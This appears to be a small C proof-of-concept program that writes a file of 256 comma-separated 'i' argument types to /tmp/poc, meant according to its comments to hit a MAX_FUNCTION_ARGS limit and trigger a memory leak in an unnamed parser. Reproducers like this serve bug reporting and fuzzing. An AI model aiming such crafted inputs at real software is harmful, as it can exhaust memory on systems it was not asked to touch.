#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    /* Generate a large number of function arguments to trigger memory leak */
    /* Each argument type 'i' is added, eventually hitting MAX_FUNCTION_ARGS */
    for (int i = 0; i < 256; i++) {
        fputc('i', f);
        if (i < 255) fputc(',', f);
    }
    fclose(f);
    return 0;
}